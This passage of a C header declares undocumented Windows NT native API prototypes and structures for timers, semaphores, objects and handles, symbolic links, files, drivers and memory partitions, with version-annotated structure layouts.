    SynchronizationTimer
} TIMER_TYPE;

typedef enum _TIMER_INFORMATION_CLASS {
    TimerBasicInformation
} TIMER_INFORMATION_CLASS;

typedef struct _TIMER_BASIC_INFORMATION {
    LARGE_INTEGER RemainingTime;
    BOOLEAN TimerState;
} TIMER_BASIC_INFORMATION, *PTIMER_BASIC_INFORMATION;

typedef enum _TIMER_SET_INFORMATION_CLASS {
    TimerSetCoalescableTimer,
    MaxTimerInfoClass
} TIMER_SET_INFORMATION_CLASS;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateTimer(
    _In_ PHANDLE TimerHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ TIMER_TYPE TimerType);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateTimer2(
    _Out_ PHANDLE TimerHandle,
    _In_opt_ PVOID Reserved1,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG Attributes,
    _In_ ACCESS_MASK DesiredAccess);

NTSYSAPI
NTSTATUS
NTAPI
NtSetTimer(
    _In_ HANDLE TimerHandle,
    _In_ PLARGE_INTEGER DueTime,
    _In_opt_ PTIMER_APC_ROUTINE TimerApcRoutine,
    _In_opt_ PVOID TimerContext,
    _In_ BOOLEAN WakeTimer,
    _In_opt_ LONG Period,
    _Out_opt_ PBOOLEAN PreviousState);

NTSYSAPI
NTSTATUS
NTAPI
NtSetTimer2(
    _In_ HANDLE TimerHandle,
    _In_ PLARGE_INTEGER DueTime,
    _In_opt_ PLARGE_INTEGER Period,
    _In_ PVOID Parameters);

NTSYSAPI
NTSTATUS
NTAPI
NtSetTimerEx(
    _In_ HANDLE TimerHandle,
    _In_ TIMER_SET_INFORMATION_CLASS TimerSetInformationClass,
    _Inout_updates_bytes_opt_(TimerSetInformationLength) PVOID TimerSetInformation,
    _In_ ULONG TimerSetInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenTimer(
    _In_ PHANDLE TimerHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryTimer(
    _In_ HANDLE TimerHandle,
    _In_ TIMER_INFORMATION_CLASS TimerInformationClass,
    _Out_writes_bytes_(TimerInformationLength) PVOID TimerInformation,
    _In_ ULONG TimerInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtCancelTimer(
    _In_ HANDLE TimerHandle,
    _Out_opt_ PBOOLEAN CurrentState);

NTSYSAPI
NTSTATUS
NTAPI
NtCancelTimer2(
    _In_ HANDLE TimerHandle,
    _In_ PVOID Parameters);

//ref from ph2

NTSYSAPI
NTSTATUS
NTAPI
NtCreateIRTimer(
    _Out_ PHANDLE TimerHandle,
    _In_ ACCESS_MASK DesiredAccess);

NTSYSAPI
NTSTATUS
NTAPI
NtSetIRTimer(
    _In_ HANDLE TimerHandle,
    _In_opt_ PLARGE_INTEGER DueTime);


/************************************************************************************
*
* Semaphore API.
*
************************************************************************************/

typedef enum _SEMAPHORE_INFORMATION_CLASS {
    SemaphoreBasicInformation
} SEMAPHORE_INFORMATION_CLASS;

typedef struct _SEMAPHORE_BASIC_INFORMATION {
    LONG CurrentCount;
    LONG MaximumCount;
} SEMAPHORE_BASIC_INFORMATION, *PSEMAPHORE_BASIC_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateSemaphore(
    _Out_ PHANDLE SemaphoreHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ LONG InitialCount,
    _In_ LONG MaximumCount);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenSemaphore(
    _Out_ PHANDLE SemaphoreHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySemaphore(
    _In_ HANDLE SemaphoreHandle,
    _In_ SEMAPHORE_INFORMATION_CLASS SemaphoreInformationClass,
    _Out_writes_bytes_(SemaphoreInformationLength) PVOID SemaphoreInformation,
    _In_ ULONG SemaphoreInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtReleaseSemaphore(
    _In_ HANDLE SemaphoreHandle,
    _In_ LONG ReleaseCount,
    _Out_opt_ PLONG PreviousCount);

/************************************************************************************
*
* Object and Handle API.
*
************************************************************************************/
typedef enum _OBJECT_INFORMATION_CLASS {
    ObjectBasicInformation,
    ObjectNameInformation,
    ObjectTypeInformation,
    ObjectTypesInformation,
    ObjectHandleFlagInformation,
    ObjectSessionInformation,
    ObjectSessionObjectInformation,
    ObjectSetRefTraceInformation,
    MaxObjectInfoClass
} OBJECT_INFORMATION_CLASS;

typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;

typedef struct _OBJECT_BASIC_INFORMATION {
    ULONG Attributes;
    ACCESS_MASK GrantedAccess;
    ULONG HandleCount;
    ULONG PointerCount;
    ULONG PagedPoolCharge;
    ULONG NonPagedPoolCharge;
    ULONG Reserved[3];
    ULONG NameInfoSize;
    ULONG TypeInfoSize;
    ULONG SecurityDescriptorSize;
    LARGE_INTEGER CreationTime;
} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;

typedef struct _OBJECT_NAME_INFORMATION {
    UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, *POBJECT_NAME_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION_V2 {
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    UCHAR TypeIndex;
    CHAR ReservedByte;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION_V2, *POBJECT_TYPE_INFORMATION_V2;

typedef struct _OBJECT_TYPES_INFORMATION {
    ULONG NumberOfTypes;
} OBJECT_TYPES_INFORMATION, *POBJECT_TYPES_INFORMATION;

#define OBJECT_TYPES_FIRST_ENTRY(ObjectTypes) (POBJECT_TYPE_INFORMATION)\
    RtlOffsetToPointer(ObjectTypes, ALIGN_UP(sizeof(OBJECT_TYPES_INFORMATION), ULONG_PTR))

#define OBJECT_TYPES_NEXT_ENTRY(ObjectType) (POBJECT_TYPE_INFORMATION)\
    RtlOffsetToPointer(ObjectType, sizeof(OBJECT_TYPE_INFORMATION) + \
    ALIGN_UP(ObjectType->TypeName.MaximumLength, ULONG_PTR))

typedef struct _OBJECT_HANDLE_FLAG_INFORMATION {
    BOOLEAN Inherit;
    BOOLEAN ProtectFromClose;
} OBJECT_HANDLE_FLAG_INFORMATION, *POBJECT_HANDLE_FLAG_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtClose(
    _In_ _Post_ptr_invalid_ HANDLE Handle);

NTSYSAPI
NTSTATUS
NTAPI
NtDuplicateObject(
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _In_opt_ HANDLE TargetProcessHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options);

NTSYSAPI
NTSTATUS
NTAPI
NtMakePermanentObject(
    _In_ HANDLE Handle);

NTSYSAPI
NTSTATUS
NTAPI
NtMakeTemporaryObject(
    _In_ HANDLE Handle);

NTSYSAPI
NTSTATUS
NTAPI
NtSetSecurityObject(
    _In_ HANDLE Handle,
    _In_ SECURITY_INFORMATION SecurityInformation,
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor);

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySecurityObject(
    _In_ HANDLE Handle,
    _In_ SECURITY_INFORMATION SecurityInformation,
    _Out_writes_bytes_opt_(Length) PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ ULONG Length,
    _Out_ PULONG LengthNeeded);

NTSYSAPI
NTSTATUS
NTAPI
NtCompareObjects(
    _In_ HANDLE FirstObjectHandle,
    _In_ HANDLE SecondObjectHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryObject(
    _In_opt_ HANDLE Handle,
    _In_ OBJECT_INFORMATION_CLASS ObjectInformationClass,
    _Out_writes_bytes_opt_(ObjectInformationLength) PVOID ObjectInformation,
    _In_ ULONG ObjectInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationObject(
    _In_ HANDLE Handle,
    _In_ OBJECT_INFORMATION_CLASS ObjectInformationClass,
    _In_reads_bytes_(ObjectInformationLength) PVOID ObjectInformation,
    _In_ ULONG ObjectInformationLength);

typedef enum _WAIT_TYPE {
    WaitAll,
    WaitAny,
    WaitNotification
} WAIT_TYPE;

NTSYSAPI
NTSTATUS
NTAPI
NtWaitForSingleObject(
    _In_ HANDLE Handle,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout);

NTSYSAPI
NTSTATUS
NTAPI
NtWaitForMultipleObjects(
    _In_ ULONG Count,
    _In_reads_(Count) HANDLE Handles[],
    _In_ WAIT_TYPE WaitType,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout);

/************************************************************************************
*
* Time.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySystemTime(
    _Out_ PLARGE_INTEGER SystemTime);

NTSYSAPI
NTSTATUS
NTAPI
NtSetSystemTime(
    _In_opt_ PLARGE_INTEGER SystemTime,
    _Out_opt_ PLARGE_INTEGER PreviousTime);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryTimerResolution(
    _Out_ PULONG MaximumTime,
    _Out_ PULONG MinimumTime,
    _Out_ PULONG CurrentTime);

NTSYSAPI
NTSTATUS
NTAPI
NtSetTimerResolution(
    _In_ ULONG DesiredTime,
    _In_ BOOLEAN SetResolution,
    _Out_ PULONG ActualTime);

/************************************************************************************
*
* Directory Object API.
*
************************************************************************************/

#define OBJDIR_FLAG_SHADOW_PRESENT 0x4
#define OBJDIR_FLAG_SANDBOX 0x10

NTSYSAPI
NTSTATUS
NTAPI
NtCreateDirectoryObject(
    _Out_ PHANDLE DirectoryHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateDirectoryObjectEx(
    _Out_ PHANDLE DirectoryHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ShadowDirectoryHandle,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenDirectoryObject(
    _Out_ PHANDLE DirectoryHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryDirectoryObject(
    _In_ HANDLE DirectoryHandle,
    _Out_writes_bytes_opt_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_ BOOLEAN RestartScan,
    _Inout_ PULONG Context,
    _Out_opt_ PULONG ReturnLength);

/************************************************************************************
*
* Private Namespace API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtCreatePrivateNamespace(
    _Out_ PHANDLE NamespaceHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PVOID BoundaryDescriptor);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenPrivateNamespace(
    _Out_ PHANDLE NamespaceHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PVOID BoundaryDescriptor);

NTSYSAPI
NTSTATUS
NTAPI
NtDeletePrivateNamespace(
    _In_ HANDLE NamespaceHandle);

/************************************************************************************
*
* Symbolic Link API.
*
************************************************************************************/

typedef enum _SYMBOLIC_LINK_INFO_CLASS {
    SymbolicLinkGlobalInformation = 1,
    SymbolicLinkAccessMask,
    MaxnSymbolicLinkInfoClass
} SYMBOLIC_LINK_INFO_CLASS;

typedef struct _OBJECT_SYMBOLIC_LINK_V1 { //pre Win10 TH1
    LARGE_INTEGER CreationTime;
    UNICODE_STRING LinkTarget;
    ULONG DosDeviceDriveIndex;
} OBJECT_SYMBOLIC_LINK_V1, *POBJECT_SYMBOLIC_LINK_V1;

typedef struct _OBJECT_SYMBOLIC_LINK_V2 { //Win10 TH1/TH2
    LARGE_INTEGER CreationTime;
    UNICODE_STRING LinkTarget;
    ULONG DosDeviceDriveIndex;
    ULONG Flags;
} OBJECT_SYMBOLIC_LINK_V2, *POBJECT_SYMBOLIC_LINK_V2;

typedef struct _OBJECT_SYMBOLIC_LINK_V3 { //Win10 RS1
    LARGE_INTEGER CreationTime;
    UNICODE_STRING LinkTarget;
    ULONG DosDeviceDriveIndex;
    ULONG Flags;
    ULONG AccessMask;
} OBJECT_SYMBOLIC_LINK_V3, *POBJECT_SYMBOLIC_LINK_V3;

typedef struct _OBJECT_SYMBOLIC_LINK_V4 { //Win10 RS2+
    LARGE_INTEGER CreationTime;
    union {
        UNICODE_STRING LinkTarget;
        struct {
            PVOID Callback;
            PVOID CallbackContext;
        };
    } u1;
    ULONG DosDeviceDriveIndex;
    ULONG Flags;
    ULONG AccessMask;
    //long __PADDING__[1];
} OBJECT_SYMBOLIC_LINK_V4, *POBJECT_SYMBOLIC_LINK_V4; /* size: 0x0028 */

typedef struct _OBJECT_SYMBOLIC_LINK_V5 { //Win10 21H1+
    LARGE_INTEGER CreationTime;
    union {
        UNICODE_STRING LinkTarget;
        struct {
            PVOID Callback;
            PVOID CallbackContext;
        };
    } u1;
    ULONG DosDeviceDriveIndex;
    ULONG Flags;
    ULONG AccessMask;
    ULONG IntegrityLevel;
} OBJECT_SYMBOLIC_LINK_V5, * POBJECT_SYMBOLIC_LINK_V5; /* size: 0x0028 */

NTSYSAPI
NTSTATUS
NTAPI
NtCreateSymbolicLinkObject(
    _Out_ PHANDLE LinkHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PUNICODE_STRING LinkTarget);

NTSYSAPI
NTSTATUS
WINAPI
NtOpenSymbolicLinkObject(
    _Out_ PHANDLE LinkHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySymbolicLinkObject(
    _In_ HANDLE LinkHandle,
    _Inout_ PUNICODE_STRING LinkTarget,
    _Out_opt_ PULONG  ReturnedLength);

NTSTATUS
NTAPI
NtSetInformationSymbolicLink(
    _In_ HANDLE LinkHandle,
    _In_ SYMBOLIC_LINK_INFO_CLASS SymbolicLinkInformationClass,
    _In_reads_bytes_(SymbolicLinkInformationLength) PVOID SymbolicLinkInformation,
    _In_ ULONG SymbolicLinkInformationLength);

/************************************************************************************
*
* File API (+Driver&HotPatch).
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtCreateFile(
    _Out_ PHANDLE FileHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_opt_ PLARGE_INTEGER AllocationSize,
    _In_ ULONG FileAttributes,
    _In_ ULONG ShareAccess,
    _In_ ULONG CreateDisposition,
    _In_ ULONG CreateOptions,
    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
    _In_ ULONG EaLength);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateNamedPipeFile(
    _Out_ PHANDLE FileHandle,
    _In_ ULONG DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG ShareAccess,
    _In_ ULONG CreateDisposition,
    _In_ ULONG CreateOptions,
    _In_ ULONG NamedPipeType,
    _In_ ULONG ReadMode,
    _In_ ULONG CompletionMode,
    _In_ ULONG MaximumInstances,
    _In_ ULONG InboundQuota,
    _In_ ULONG OutboundQuota,
    _In_opt_ PLARGE_INTEGER DefaultTimeout);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateMailslotFile(
    _Out_ PHANDLE FileHandle,
    _In_ ULONG DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG CreateOptions,
    _In_ ULONG MailslotQuota,
    _In_ ULONG MaximumMessageSize,
    _In_ PLARGE_INTEGER ReadTimeout);

NTSYSAPI
NTSTATUS
NTAPI
NtDeviceIoControlFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG IoControlCode,
    _In_reads_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength);

NTSYSAPI
NTSTATUS
NTAPI
NtFsControlFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG FsControlCode,
    _In_reads_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenFile(
    _Out_ PHANDLE FileHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG ShareAccess,
    _In_ ULONG OpenOptions);

NTSYSAPI
NTSTATUS
NTAPI
NtReadFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key);

NTSYSAPI
NTSTATUS
NTAPI
NtWriteFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_reads_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key);

NTSYSAPI
NTSTATUS
NTAPI
NtLockFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PLARGE_INTEGER ByteOffset,
    _In_ PLARGE_INTEGER Length,
    _In_ ULONG Key,
    _In_ BOOLEAN FailImmediately,
    _In_ BOOLEAN ExclusiveLock);

NTSYSAPI
NTSTATUS
NTAPI
NtUnlockFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PLARGE_INTEGER ByteOffset,
    _In_ PLARGE_INTEGER Length,
    _In_ ULONG Key);

NTSYSAPI
NTSTATUS
NTAPI
NtFlushBuffersFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
NtDeleteFile(
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryFullAttributesFile(
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PFILE_NETWORK_OPEN_INFORMATION FileInformation);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryDirectoryFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_opt_ PUNICODE_STRING FileName,
    _In_ BOOLEAN RestartScan);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryDirectoryFileEx(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass,
    _In_ ULONG QueryFlags,
    _In_opt_ PUNICODE_STRING FileName);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryEaFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_reads_bytes_opt_(EaListLength) PVOID EaList,
    _In_ ULONG EaListLength,
    _In_opt_ PULONG EaIndex,
    _In_ BOOLEAN RestartScan);

NTSYSAPI
NTSTATUS
NTAPI
NtSetEaFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_bytecount_(Length) PVOID Buffer,
    _In_ ULONG Length);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryVolumeInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID FsInformation,
    _In_ ULONG Length,
    _In_ FS_INFORMATION_CLASS FsInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryQuotaInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_reads_bytes_opt_(SidListLength) PVOID SidList,
    _In_ ULONG SidListLength,
    _In_opt_ PSID StartSid,
    _In_ BOOLEAN RestartScan);

NTSYSAPI
NTSTATUS
NTAPI
NtSetQuotaInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_reads_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length);

NTSYSAPI
NTSTATUS
NTAPI
NtReadFileScatter(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PFILE_SEGMENT_ELEMENT SegmentArray,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key);

NTSYSAPI
NTSTATUS
NTAPI
NtWriteFileGather(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PFILE_SEGMENT_ELEMENT SegmentArray,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key);

NTSYSAPI
NTSTATUS
NTAPI
NtNotifyChangeDirectoryFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_ ULONG CompletionFilter,
    _In_ BOOLEAN WatchTree);

NTSYSAPI
NTSTATUS
NTAPI
NtCopyFileChunk(
    _In_ HANDLE SourceHandle,
    _In_ HANDLE DestinationHandle,
    _In_opt_ HANDLE EventHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG Length,
    _In_ PLARGE_INTEGER SourceOffset,
    _In_ PLARGE_INTEGER DestOffset,
    _In_opt_ PULONG SourceKey,
    _In_opt_ PULONG DestKey,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadDriver(
    _In_ PUNICODE_STRING DriverServiceName);

NTSYSAPI
NTSTATUS
NTAPI
NtUnloadDriver(
    _In_ PUNICODE_STRING DriverServiceName);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadHotPatch(
    _In_ PUNICODE_STRING HotPatchName,
    _Reserved_ ULONG LoadFlag);

NTSYSAPI
NTSTATUS
NTAPI
NtManageHotPatch(
    _In_ ULONG HotPatchInformationClass,
    _Out_writes_bytes_opt_(HotPatchInformationLength) PVOID HotPatchInformation,
    _In_ ULONG HotPatchInformationLength,
    _Out_opt_ PULONG ReturnLength);

/************************************************************************************
*
* Section API (+MemoryPartitions).
*
************************************************************************************/

#define MEM_EXECUTE_OPTION_ENABLE 0x1
#define MEM_EXECUTE_OPTION_DISABLE 0x2
#define MEM_EXECUTE_OPTION_DISABLE_THUNK_EMULATION 0x4
#define MEM_EXECUTE_OPTION_PERMANENT 0x8
#define MEM_EXECUTE_OPTION_EXECUTE_DISPATCH_ENABLE 0x10
#define MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE 0x20
#define MEM_EXECUTE_OPTION_VALID_FLAGS 0x3f

typedef enum _MEMORY_PARTITION_INFORMATION_CLASS {
    SystemMemoryPartitionInformation,
    SystemMemoryPartitionMoveMemory,
    SystemMemoryPartitionAddPagefile,
    SystemMemoryPartitionCombineMemory,
    SystemMemoryPartitionInitialAddMemory,
    SystemMemoryPartitionGetMemoryEvents,
    SystemMemoryPartitionSetAttributes,
    SystemMemoryPartitionNodeInformation,
    SystemMemoryPartitionCreateLargePages,
    SystemMemoryPartitionDedicatedMemoryInformation,
    SystemMemoryPartitionOpenDedicatedMemory,
    SystemMemoryPartitionMemoryChargeAttributes,
    SystemMemoryPartitionClearAttributes,
    SystemMemoryPartitionSetMemoryThresholds,
    SystemMemoryPartitionMemoryListCommand,
    SystemMemoryPartitionMax
} MEMORY_PARTITION_INFORMATION_CLASS;

typedef struct _MEMORY_PARTITION_PAGE_RANGE {
    ULONG_PTR StartPage;
    ULONG_PTR NumberOfPages;
} MEMORY_PARTITION_PAGE_RANGE, *PMEMORY_PARTITION_PAGE_RANGE;

typedef struct _MEMORY_PARTITION_INITIAL_ADD_INFORMATION {
    ULONG Flags;
    ULONG NumberOfRanges;
    ULONG_PTR NumberOfPagesAdded;
    MEMORY_PARTITION_PAGE_RANGE PartitionRanges[1];
} MEMORY_PARTITION_INITIAL_ADD_INFORMATION, *PMEMORY_PARTITION_INITIAL_ADD_INFORMATION;

